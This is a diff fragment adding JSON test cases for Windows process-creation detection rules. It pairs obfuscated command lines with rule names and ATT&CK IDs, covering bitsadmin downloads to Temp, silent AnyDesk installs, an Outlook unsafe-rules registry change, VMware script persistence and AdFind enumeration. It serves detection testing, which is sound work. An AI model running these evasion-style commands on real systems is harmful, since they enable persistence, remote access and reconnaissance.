+        "test_id":  "proc_creation_win_net_view_share_and_sessions_enum_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net1.exe vi\"\"ew /all",
+        "target_rule":  "proc_creation_win_net_view_share_and_sessions_enum",
+        "technique_id":  "T1018"
+    },
+    {
+        "test_id":  "proc_creation_win_net_view_share_and_sessions_enum_curated_4",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net.EXE \"v\"\"iew\" /all /domain",
+        "target_rule":  "proc_creation_win_net_view_share_and_sessions_enum",
+        "technique_id":  "T1018"
+    },
+    {
+        "test_id":  "proc_creation_win_net_view_share_and_sessions_enum_curated_5",
+        "target_commandline":  "C:\\\\WINDOWS\\\\system32\\\\net.EXE view",
+        "target_rule":  "proc_creation_win_net_view_share_and_sessions_enum",
+        "technique_id":  "T1018"
+    },
+    {
+        "test_id":  "proc_creation_win_pua_adfind_susp_usage_curated_1",
+        "target_commandline":  "C:\\AtomicRedTeam\\atomics\\T1087.002\\bin\\AdFind.exe -f \"objectcategory\"=computer",
+        "target_rule":  "proc_creation_win_pua_adfind_susp_usage",
+        "technique_id":  "T1018"
+    },
+    {
+        "test_id":  "proc_creation_win_chcp_codepage_lookup_curated_1",
+        "target_commandline":  "chcp.com",
+        "target_rule":  "proc_creation_win_chcp_codepage_lookup",
+        "technique_id":  "T1614.001"
+    },
+    {
+        "test_id":  "proc_creation_win_chcp_codepage_lookup_curated_2",
+        "target_commandline":  "chcp",
+        "target_rule":  "proc_creation_win_chcp_codepage_lookup",
+        "technique_id":  "T1614.001"
+    },
+    {
+        "test_id":  "proc_creation_win_chcp_codepage_lookup_curated_3",
+        "target_commandline":  "\"C:\\WINDOWS\\system32\\chcp.com\"",
+        "target_rule":  "proc_creation_win_chcp_codepage_lookup",
+        "technique_id":  "T1614.001"
+    },
+    {
+        "test_id":  "proc_creation_win_chcp_codepage_lookup_curated_4",
+        "target_commandline":  "\"C:\\WINDOWS\\system32\\chcp.com\" \u003enul",
+        "target_rule":  "proc_creation_win_chcp_codepage_lookup",
+        "technique_id":  "T1614.001"
+    },
+    {
+        "test_id":  "proc_creation_win_chcp_codepage_lookup_curated_5",
+        "target_commandline":  "C:\\Windows\\System32\\chcp.com",
+        "target_rule":  "proc_creation_win_chcp_codepage_lookup",
+        "technique_id":  "T1614.001"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_pcalua_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\pcalua.exe\t-a C:\\Windows\\System32\\calc.exe",
+        "target_rule":  "proc_creation_win_lolbin_pcalua",
+        "technique_id":  "T1059"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_pcalua_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\pcalua.exe \"-a\" C:\\Windows\\System32\\calc.exe",
+        "target_rule":  "proc_creation_win_lolbin_pcalua",
+        "technique_id":  "T1059"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_pcalua_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\system32\\pcalua.exe\t-a calc.exe",
+        "target_rule":  "proc_creation_win_lolbin_pcalua",
+        "technique_id":  "T1059"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_pcalua_curated_4",
+        "target_commandline":  "C:\\WINDOWS\\system32\\pcalua.exe \"-a\" calc.exe",
+        "target_rule":  "proc_creation_win_lolbin_pcalua",
+        "technique_id":  "T1059"
+    },
+    {
+        "test_id":  "proc_creation_win_office_outlook_enable_unsafe_client_mail_rules_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\reg.exe add \"HKCU\\Software\\Microsoft\\Office\\16.0\\Outlook\"\\\"Security\" /v EnableUnsafeClientMailRules /t REG_DWORD /d 1",
+        "target_rule":  "proc_creation_win_office_outlook_enable_unsafe_client_mail_rules",
+        "technique_id":  "T1059"
+    },
+    {
+        "test_id":  "proc_creation_win_office_outlook_enable_unsafe_client_mail_rules_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\reg.exe add HKCU\\Software\\Microsoft\\Office\\16.0\\Outlook^\\Security /v EnableUnsafeClientMailRules /t REG_DWORD /d 1",
+        "target_rule":  "proc_creation_win_office_outlook_enable_unsafe_client_mail_rules",
+        "technique_id":  "T1059"
+    },
+    {
+        "test_id":  "proc_creation_win_office_outlook_enable_unsafe_client_mail_rules_curated_3",
+        "target_commandline":  "reg.exe add HKCU\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security /v \"EnableUnsafeClientMailRules\" /t REG_DWORD /d 1",
+        "target_rule":  "proc_creation_win_office_outlook_enable_unsafe_client_mail_rules",
+        "technique_id":  "T1059"
+    },
+    {
+        "test_id":  "proc_creation_win_office_outlook_enable_unsafe_client_mail_rules_curated_4",
+        "target_commandline":  "C:\\WINDOWS\\system32\\reg.exe add HKCU\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security /v \"EnableUnsafeClientMailRules\" /t REG_DWORD /d 1",
+        "target_rule":  "proc_creation_win_office_outlook_enable_unsafe_client_mail_rules",
+        "technique_id":  "T1059"
+    },
+    {
+        "test_id":  "proc_creation_win_vmware_toolbox_cmd_persistence_curated_1",
+        "target_commandline":  "\"C:\\Program Files\\VMware\\VMware Tools\\VMwareToolboxCmd.exe\" \"script\" set C:\\temp\\payload.bat",
+        "target_rule":  "proc_creation_win_vmware_toolbox_cmd_persistence",
+        "technique_id":  "T1059"
+    },
+    {
+        "test_id":  "proc_creation_win_vmware_toolbox_cmd_persistence_curated_2",
+        "target_commandline":  "\"C:\\Program Files\\VMware\\VMware Tools\\VMwareToolboxCmd.exe\" script \"set\" C:\\temp\\payload.bat",
+        "target_rule":  "proc_creation_win_vmware_toolbox_cmd_persistence",
+        "technique_id":  "T1059"
+    },
+    {
+        "test_id":  "proc_creation_win_vmware_toolbox_cmd_persistence_curated_3",
+        "target_commandline":  "\"C:\\Program Files\\VMware\\VMware Tools\\VMwareToolboxCmd.exe\" \"script\" \"set\" C:\\temp\\payload.bat",
+        "target_rule":  "proc_creation_win_vmware_toolbox_cmd_persistence",
+        "technique_id":  "T1059"
+    },
+    {
+        "test_id":  "proc_creation_win_renamed_pingcastle_curated_1",
+        "target_commandline":  "cmd.exe /c copy C:\\PATH_NOT_FOUND\\pingcastle.exe C:\\Temp\\not_pingcastle.exe \u0026\u0026 C:\\Temp\\not_pingcastle.exe --scanner \"aclcheck\"",
+        "target_rule":  "proc_creation_win_renamed_pingcastle",
+        "technique_id":  "T1059"
+    },
+    {
+        "test_id":  "proc_creation_win_renamed_pingcastle_curated_2",
+        "target_commandline":  "cmd.exe /c copy C:\\PATH_NOT_FOUND\\pingcastle.exe C:\\Temp\\not_pingcastle.exe \u0026\u0026 C:\\Temp\\not_pingcastle.exe --scanner  aclcheck",
+        "target_rule":  "proc_creation_win_renamed_pingcastle",
+        "technique_id":  "T1059"
+    },
+    {
+        "test_id":  "proc_creation_win_renamed_pingcastle_curated_3",
+        "target_commandline":  "cmd.exe /c copy C:\\PATH_NOT_FOUND\\pingcastle.exe C:\\Temp\\not_pingcastle.exe \u0026\u0026 C:\\Temp\\not_pingcastle.exe \"--scanner\" aclcheck",
+        "target_rule":  "proc_creation_win_renamed_pingcastle",
+        "technique_id":  "T1059"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_script_exec_from_temp_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\System32\\WScript.exe C:/Users/bkcs/AppData/Local/Temp/AtomicTest.vbs",
+        "target_rule":  "proc_creation_win_susp_script_exec_from_temp",
+        "technique_id":  "T1059"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_script_exec_from_temp_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\System32\\WScript.exe C:\\Users\\bkcs\\AppData\\Local\\.\\Temp\\AtomicTest.vbs",
+        "target_rule":  "proc_creation_win_susp_script_exec_from_temp",
+        "technique_id":  "T1059"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_script_exec_from_temp_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\System32\\WScript.exe C:\\Users\\bkcs\\AppData\\Local\\Te\"\"mp\\AtomicTest.vbs",
+        "target_rule":  "proc_creation_win_susp_script_exec_from_temp",
+        "technique_id":  "T1059"
+    },
+    {
+        "test_id":  "proc_creation_win_ftp_arbitrary_command_execution_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\ftp.exe -\"\"s:C:\\temp\\script.txt",
+        "target_rule":  "proc_creation_win_ftp_arbitrary_command_execution",
+        "technique_id":  "T1059"
+    },
+    {
+        "test_id":  "proc_creation_win_ftp_arbitrary_command_execution_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\ftp.exe -s\":C:\\temp\\script.txt\"",
+        "target_rule":  "proc_creation_win_ftp_arbitrary_command_execution",
+        "technique_id":  "T1059"
+    },
+    {
+        "test_id":  "proc_creation_win_cmd_dosfuscation_curated_1",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c echo ^",
+        "target_rule":  "proc_creation_win_cmd_dosfuscation",
+        "technique_id":  "T1059"
+    },
+    {
+        "test_id":  "proc_creation_win_perl_inline_command_execution_curated_1",
+        "target_commandline":  "\"C:\\Program Files\\Git\\usr\\bin\\perl.exe\" \"-e\" \"print \u0027TEST-HOST\u0027\"",
+        "target_rule":  "proc_creation_win_perl_inline_command_execution",
+        "technique_id":  "T1059"
+    },
+    {
+        "test_id":  "proc_creation_win_ruby_inline_command_execution_curated_1",
+        "target_commandline":  "C:\\Ruby34-x64\\bin\\ruby.exe\t-e \"system(\u0027whoami\u0027)\"",
+        "target_rule":  "proc_creation_win_ruby_inline_command_execution",
+        "technique_id":  "T1059"
+    },
+    {
+        "test_id":  "proc_creation_win_remote_access_tools_anydesk_silent_install_curated_1",
+        "target_commandline":  "C:\\Users\\bkcs\\Desktop\\AnyDesk.exe --inst\"\"all C:\\AnyDesk --start-with-win --silent",
+        "target_rule":  "proc_creation_win_remote_access_tools_anydesk_silent_install",
+        "technique_id":  "T1219.002"
+    },
+    {
+        "test_id":  "proc_creation_win_remote_access_tools_anydesk_silent_install_curated_2",
+        "target_commandline":  "C:\\Users\\bkcs\\Desktop\\AnyDesk /install C:\\AnyDesk /start-with-win /silent",
+        "target_rule":  "proc_creation_win_remote_access_tools_anydesk_silent_install",
+        "technique_id":  "T1219.002"
+    },
+    {
+        "test_id":  "proc_creation_win_remote_access_tools_anydesk_silent_install_curated_3",
+        "target_commandline":  "C:\\Users\\bkcs\\Desktop\\AnyDesk.exe --install C:\\AnyDesk /start-with-win /silent",
+        "target_rule":  "proc_creation_win_remote_access_tools_anydesk_silent_install",
+        "technique_id":  "T1219.002"
+    },
+    {
+        "test_id":  "proc_creation_win_remote_access_tools_anydesk_silent_install_curated_4",
+        "target_commandline":  "C:\\Users\\bkcs\\Desktop\\AnyDesk.exe /install C:\\AnyDesk /start-with-win /silent",
+        "target_rule":  "proc_creation_win_remote_access_tools_anydesk_silent_install",
+        "technique_id":  "T1219.002"
+    },
+    {
+        "test_id":  "proc_creation_win_reg_query_registry_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\reg.EXE q\"uer\"y HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+        "target_rule":  "proc_creation_win_reg_query_registry",
+        "technique_id":  "T1012"
+    },
+    {
+        "test_id":  "proc_creation_win_reg_query_registry_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\reg.EXE query HKCU\\Software\\Microsoft\\Windows\\Current\"Version\\Run\"Once",
+        "target_rule":  "proc_creation_win_reg_query_registry",
+        "technique_id":  "T1012"
+    },
+    {
+        "test_id":  "proc_creation_win_reg_query_registry_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\system32\\reg.EXE query HKLM\\Software\\Microsoft\\Windows\\Current\"Version\"\\Policies\\Explorer\\Run",
+        "target_rule":  "proc_creation_win_reg_query_registry",
+        "technique_id":  "T1012"
+    },
+    {
+        "test_id":  "proc_creation_win_reg_query_registry_curated_4",
+        "target_commandline":  "C:\\WINDOWS\\system32\\reg.EXE query HKLM\\Software\\Microsoft\\Windows\\Current\"Version\"\\RunServicesOnce",
+        "target_rule":  "proc_creation_win_reg_query_registry",
+        "technique_id":  "T1012"
+    },
+    {
+        "test_id":  "proc_creation_win_pua_adfind_enumeration_curated_1",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c C:\\AtomicRedTeam\\ExternalPayloads\\AdFind.exe -default -s base lock\"\"outduration lock\"\"outthreshold lock\"\"outobservationwindow max\"\"pwdage min\"\"pwdage min\"\"pwdlength pwd\"\"historylength pwd\"\"properties",
+        "target_rule":  "proc_creation_win_pua_adfind_enumeration",
+        "technique_id":  "T1087.002"
+    },
+    {
+        "test_id":  "proc_creation_win_pua_adfind_enumeration_curated_2",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c C:\\AtomicRedTeam\\ExternalPayloads\\AdFind.exe \"-sc\" admincountdmp",
+        "target_rule":  "proc_creation_win_pua_adfind_enumeration",
+        "technique_id":  "T1087.002"
+    },
+    {
+        "test_id":  "proc_creation_win_pua_adfind_enumeration_curated_3",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\AdFind.exe -sc \"admincountdmp\"",
+        "target_rule":  "proc_creation_win_pua_adfind_enumeration",
+        "technique_id":  "T1087.002"
+    },
+    {
+        "test_id":  "proc_creation_win_pua_adfind_enumeration_curated_4",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\AdFind.exe -sc   admincountdmp",
+        "target_rule":  "proc_creation_win_pua_adfind_enumeration",
+        "technique_id":  "T1087.002"
+    },
+    {
+        "test_id":  "proc_creation_win_mmc_mmc20_lateral_movement_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\mmc.exe -Em\"bedding\"",
+        "target_rule":  "proc_creation_win_mmc_mmc20_lateral_movement",
+        "technique_id":  "T1021.003"
+    },
+    {
+        "test_id":  "proc_creation_win_mmc_mmc20_lateral_movement_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\mmc.exe ^-Embedding",
+        "target_rule":  "proc_creation_win_mmc_mmc20_lateral_movement",
+        "technique_id":  "T1021.003"
+    },
+    {
+        "test_id":  "proc_creation_win_mmc_mmc20_lateral_movement_curated_3",
+        "target_commandline":  "mmc -Embedding",
+        "target_rule":  "proc_creation_win_mmc_mmc20_lateral_movement",
+        "technique_id":  "T1021.003"
+    },
+    {
+        "test_id":  "proc_creation_win_mmc_mmc20_lateral_movement_curated_4",
+        "target_commandline":  "mmc.exe \"-Embedding\"",
+        "target_rule":  "proc_creation_win_mmc_mmc20_lateral_movement",
+        "technique_id":  "T1021.003"
+    },
+    {
+        "test_id":  "proc_creation_win_findstr_sysmon_discovery_via_default_altitude_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\findstr.exe \"385201\"",
+        "target_rule":  "proc_creation_win_findstr_sysmon_discovery_via_default_altitude",
+        "technique_id":  "T1518.001"
+    },
+    {
+        "test_id":  "proc_creation_win_findstr_sysmon_discovery_via_default_altitude_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\findstr.exe\t385201",
+        "target_rule":  "proc_creation_win_findstr_sysmon_discovery_via_default_altitude",
+        "technique_id":  "T1518.001"
+    },
+    {
+        "test_id":  "proc_creation_win_findstr_sysmon_discovery_via_default_altitude_curated_3",
+        "target_commandline":  "findstr.exe \"385201\"",
+        "target_rule":  "proc_creation_win_findstr_sysmon_discovery_via_default_altitude",
+        "technique_id":  "T1518.001"
+    },
+    {
+        "test_id":  "proc_creation_win_findstr_sysmon_discovery_via_default_altitude_curated_4",
+        "target_commandline":  "findstr.exe\t385201",
+        "target_rule":  "proc_creation_win_findstr_sysmon_discovery_via_default_altitude",
+        "technique_id":  "T1518.001"
+    },
+    {
+        "test_id":  "proc_creation_win_explorer_break_process_tree_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\explorer /root,C:\\temp\\payload.exe",
+        "target_rule":  "proc_creation_win_explorer_break_process_tree",
+        "technique_id":  "T1036"
+    },
+    {
+        "test_id":  "proc_creation_win_explorer_break_process_tree_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\explorer.exe \"/root\",C:\\temp\\payload.exe",
+        "target_rule":  "proc_creation_win_explorer_break_process_tree",
+        "technique_id":  "T1036"
+    },
+    {
+        "test_id":  "proc_creation_win_explorer_break_process_tree_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\explorer.exe \"/root,\"C:\\temp\\payload.exe",
+        "target_rule":  "proc_creation_win_explorer_break_process_tree",
+        "technique_id":  "T1036"
+    },
+    {
+        "test_id":  "proc_creation_win_explorer_break_process_tree_curated_4",
+        "target_commandline":  "explorer /root,C:\\temp\\payload.exe",
+        "target_rule":  "proc_creation_win_explorer_break_process_tree",
+        "technique_id":  "T1036"
+    },
+    {
+        "test_id":  "proc_creation_win_chcp_codepage_switch_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\chcp.com 936",
+        "target_rule":  "proc_creation_win_chcp_codepage_switch",
+        "technique_id":  "T1036"
+    },
+    {
+        "test_id":  "proc_creation_win_chcp_codepage_switch_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\chcp.com 936 \u003e nul",
+        "target_rule":  "proc_creation_win_chcp_codepage_switch",
+        "technique_id":  "T1036"
+    },
+    {
+        "test_id":  "proc_creation_win_chcp_codepage_switch_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\system32\\chcp.com 936 \u003enul",
+        "target_rule":  "proc_creation_win_chcp_codepage_switch",
+        "technique_id":  "T1036"
+    },
+    {
+        "test_id":  "proc_creation_win_chcp_codepage_switch_curated_4",
+        "target_commandline":  "C:\\WINDOWS\\system32\\chcp.com \"936\"",
+        "target_rule":  "proc_creation_win_chcp_codepage_switch",
+        "technique_id":  "T1036"
+    },
+    {
+        "test_id":  "proc_creation_win_calc_uncommon_exec_curated_1",
+        "target_commandline":  "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --disable-gpu-sandbox --gpu-launcher=\"C:/Windows/System32/calc.exe \u0026\u0026\" --flag-switches-begin --flag-switches-end --do-not-de-elevate",
+        "target_rule":  "proc_creation_win_calc_uncommon_exec",
+        "technique_id":  "T1036"
+    },
+    {
+        "test_id":  "proc_creation_win_calc_uncommon_exec_curated_2",
+        "target_commandline":  "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --disable-gpu-sandbox --gpu-launcher=\"C:\\Windows\\System32\\ca\"\"lc.exe \u0026\u0026\" --flag-switches-begin --flag-switches-end --do-not-de-elevate",
+        "target_rule":  "proc_creation_win_calc_uncommon_exec",
+        "technique_id":  "T1036"
+    },
+    {
+        "test_id":  "proc_creation_win_dumpminitool_susp_execution_curated_1",
+        "target_commandline":  "\"C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\BuildTools\\Common7\\IDE\\Extensions\\TestPlatform\\Extensions\\dump\\DumpMinitool.exe\" --file C:\\temp\\dump.dmp --processId 1337 --dumpType \"Full\"",
+        "target_rule":  "proc_creation_win_dumpminitool_susp_execution",
+        "technique_id":  "T1036"
+    },
+    {
+        "test_id":  "proc_creation_win_svchost_execution_with_no_cli_flags_curated_1",
+        "target_commandline":  "\"C:\\AtomicRedTeam\\ExternalPayloads\\svchost.exe\"",
+        "target_rule":  "proc_creation_win_svchost_execution_with_no_cli_flags",
+        "technique_id":  "T1055"
+    },
+    {
+        "test_id":  "proc_creation_win_svchost_execution_with_no_cli_flags_curated_2",
+        "target_commandline":  "C:\\AtomicRedTeam\\ExternalPayloads\\svchost.exe",
+        "target_rule":  "proc_creation_win_svchost_execution_with_no_cli_flags",
+        "technique_id":  "T1055"
+    },
+    {
+        "test_id":  "proc_creation_win_svchost_execution_with_no_cli_flags_curated_3",
+        "target_commandline":  "\"C:\\\\AtomicRedTeam\\\\ExternalPayloads\\\\svchost.exe\"",
+        "target_rule":  "proc_creation_win_svchost_execution_with_no_cli_flags",
+        "technique_id":  "T1055"
+    },
+    {
+        "test_id":  "proc_creation_win_svchost_execution_with_no_cli_flags_curated_4",
+        "target_commandline":  "C:\\AtomicRedTeam\\ExternalPayloads\\svchost",
+        "target_rule":  "proc_creation_win_svchost_execution_with_no_cli_flags",
+        "technique_id":  "T1055"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_sysnative_curated_1",
+        "target_commandline":  "cmd.exe /c calc.exe",
+        "target_rule":  "proc_creation_win_susp_sysnative",
+        "technique_id":  "T1055"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_sysnative_curated_2",
+        "target_commandline":  "\"C:\\\\Windows\\\\System32\\\\cmd.exe\" /c calc.exe",
+        "target_rule":  "proc_creation_win_susp_sysnative",
+        "technique_id":  "T1055"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_sysnative_curated_3",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c calc.exe",
+        "target_rule":  "proc_creation_win_susp_sysnative",
+        "technique_id":  "T1055"
+    },
+    {
+        "test_id":  "proc_creation_win_bitsadmin_download_susp_extensions_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\bitsadmin.exe /\"addfile\" AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\bkcs\\AppData\\Local\\Temp\\bitsadmin3_flag.ps1",
+        "target_rule":  "proc_creation_win_bitsadmin_download_susp_extensions",
+        "technique_id":  "T1197"
+    },
+    {
+        "test_id":  "proc_creation_win_bitsadmin_download_susp_extensions_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\bitsadmin.exe \"/transfer\" /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\bkcs\\AppData\\Local\\Temp\\bitsadmin1_flag.ps1",
+        "target_rule":  "proc_creation_win_bitsadmin_download_susp_extensions",
+        "technique_id":  "T1197"
+    },
+    {
+        "test_id":  "proc_creation_win_bitsadmin_download_susp_extensions_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\system32\\bitsadmin.exe\t/transfer\t/Download\t/priority\tForeground\thttps://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md\tC:\\Users\\bkcs\\AppData\\Local\\Temp\\bitsadmin1_flag.ps1",
+        "target_rule":  "proc_creation_win_bitsadmin_download_susp_extensions",
+        "technique_id":  "T1197"
+    },
+    {
+        "test_id":  "proc_creation_win_bitsadmin_download_susp_extensions_curated_4",
+        "target_commandline":  "C:\\Windows\\System32\\bitsadmin.exe \"/transfer\" qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\\Users\\bkcs\\AppData\\Local\\Temp\\Atomic-license.txt",
+        "target_rule":  "proc_creation_win_bitsadmin_download_susp_extensions",
+        "technique_id":  "T1197"
+    },
+    {
+        "test_id":  "proc_creation_win_bitsadmin_download_susp_targetfolder_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\bitsadmin.exe \"/transfer\" /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\bkcs\\AppData\\Local\\Temp\\bitsadmin1_flag.ps1",
+        "target_rule":  "proc_creation_win_bitsadmin_download_susp_targetfolder",
+        "technique_id":  "T1197"
+    },
+    {
+        "test_id":  "proc_creation_win_bitsadmin_download_susp_targetfolder_curated_2",
+        "target_commandline":  "C:\\Windows\\System32\\bitsadmin.exe /trans\"fer\" qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\\Users\\bkcs\\AppData\\Local\\Temp\\Atomic-license.txt",
+        "target_rule":  "proc_creation_win_bitsadmin_download_susp_targetfolder",
+        "technique_id":  "T1197"
+    },
+    {
+        "test_id":  "proc_creation_win_bitsadmin_download_susp_targetfolder_curated_3",
+        "target_commandline":  "C:\\Windows\\System32\\bitsadmin.exe /transfer\tqcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\\Users\\bkcs\\AppData\\Local\\Temp\\Atomic-license.txt",
+        "target_rule":  "proc_creation_win_bitsadmin_download_susp_targetfolder",
+        "technique_id":  "T1197"
+    },
+    {
+        "test_id":  "proc_creation_win_bitsadmin_download_file_sharing_domains_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\bitsadmin.exe \"/transfer\" /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\bkcs\\AppData\\Local\\Temp\\bitsadmin1_flag.ps1",
+        "target_rule":  "proc_creation_win_bitsadmin_download_file_sharing_domains",
+        "technique_id":  "T1197"
+    },
+    {
+        "test_id":  "proc_creation_win_bitsadmin_download_file_sharing_domains_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\bitsadmin.exe\t/transfer\t/Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\bkcs\\AppData\\Local\\Temp\\bitsadmin1_flag.ps1",
+        "target_rule":  "proc_creation_win_bitsadmin_download_file_sharing_domains",
+        "technique_id":  "T1197"
+    },
+    {
+        "test_id":  "proc_creation_win_bitsadmin_download_file_sharing_domains_curated_3",
+        "target_commandline":  "C:\\Windows\\System32\\bitsadmin.exe \"/transfer\" qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\\Users\\bkcs\\AppData\\Local\\Temp\\Atomic-license.txt",
+        "target_rule":  "proc_creation_win_bitsadmin_download_file_sharing_domains",
+        "technique_id":  "T1197"
+    },
+    {
+        "test_id":  "proc_creation_win_bitsadmin_download_uncommon_targetfolder_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\bitsadmin.exe \"/transfer\" /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\bkcs\\AppData\\Local\\Temp\\bitsadmin1_flag.ps1",
+        "target_rule":  "proc_creation_win_bitsadmin_download_uncommon_targetfolder",
+        "technique_id":  "T1197"
+    },
+    {
+        "test_id":  "proc_creation_win_bitsadmin_download_uncommon_targetfolder_curated_2",
+        "target_commandline":  "C:\\Windows\\System32\\bitsadmin.exe /trans\"fer\" qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\\Users\\bkcs\\AppData\\Local\\Temp\\Atomic-license.txt",
+        "target_rule":  "proc_creation_win_bitsadmin_download_uncommon_targetfolder",
+        "technique_id":  "T1197"
+    },
+    {
+        "test_id":  "proc_creation_win_bitsadmin_download_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\bitsadmin.exe \"/transfer\" /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\bkcs\\AppData\\Local\\Temp\\bitsadmin1_flag.ps1",
+        "target_rule":  "proc_creation_win_bitsadmin_download",
+        "technique_id":  "T1197"
+    },
+    {
+        "test_id":  "proc_creation_win_bitsadmin_download_curated_2",
+        "target_commandline":  "C:\\Windows\\System32\\bitsadmin.exe \"/transfer\" qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\\Users\\bkcs\\AppData\\Local\\Temp\\Atomic-license.txt",
+        "target_rule":  "proc_creation_win_bitsadmin_download",
+        "technique_id":  "T1197"
+    },
+    {
+        "test_id":  "proc_creation_win_bitsadmin_potential_persistence_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\bitsadmin.exe /\"addfile\" AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\bkcs\\AppData\\Local\\Temp\\bitsadmin3_flag.ps1",
+        "target_rule":  "proc_creation_win_bitsadmin_potential_persistence",
+        "technique_id":  "T1197"
+    },
+    {
+        "test_id":  "proc_creation_win_wmic_recon_system_info_uncommon_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\System32\\Wbem\\wmic.EXE OS get \"Caption\",\"OSArchitecture\",\"Version\"",
+        "target_rule":  "proc_creation_win_wmic_recon_system_info_uncommon",
+        "technique_id":  "T1082"
+    },
+    {
+        "test_id":  "proc_creation_win_wmic_recon_system_info_uncommon_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\System32\\Wbem\\wmic.EXE LOGICALDISK get \"Name\",\"Size\",\"FreeSpace\"",
+        "target_rule":  "proc_creation_win_wmic_recon_system_info_uncommon",
+        "technique_id":  "T1082"
+    },
+    {
+        "test_id":  "proc_creation_win_wmic_recon_system_info_uncommon_curated_3",
+        "target_commandline":  "wmic \"DISKDRIVE\" get \"Caption\"",
+        "target_rule":  "proc_creation_win_wmic_recon_system_info_uncommon",
+        "technique_id":  "T1082"
+    },
+    {
+        "test_id":  "proc_creation_win_wmic_recon_system_info_uncommon_curated_4",
+        "target_commandline":  "%WINDIR%\\\\System32\\\\Wbem\\\\wmic.exe DISKDRIVE get Caption",
+        "target_rule":  "proc_creation_win_wmic_recon_system_info_uncommon",
+        "technique_id":  "T1082"
+    },
+    {
+        "test_id":  "proc_creation_win_reg_machineguid_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\REG.EXE QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\\"Cryptography\" /v MachineGuid",
+        "target_rule":  "proc_creation_win_reg_machineguid",
